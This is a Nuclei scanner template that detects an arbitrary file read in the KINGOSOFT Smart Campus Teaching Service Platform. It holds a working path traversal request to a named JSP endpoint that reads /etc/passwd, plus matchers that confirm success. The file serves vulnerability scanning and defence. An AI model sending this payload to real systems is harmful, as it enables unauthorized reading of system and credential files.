id: kingosoft-usctcsp-file-read
info:
  name: KINGOSOFT Smart Campus Teaching Service Platform Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read

http:
  - method: GET
    path:
      - "{{BaseURL}}/zgks/downloadzgkssmwd.jsp?fp=../../../../../../../../../../../etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
      - type: word
        part: body
        words:
          - "<"
        negative: true
      - type: word
        part: header
        words:
          - "filename="
      - type: word
        part: header
        words:
          - "application/x-msdownload"
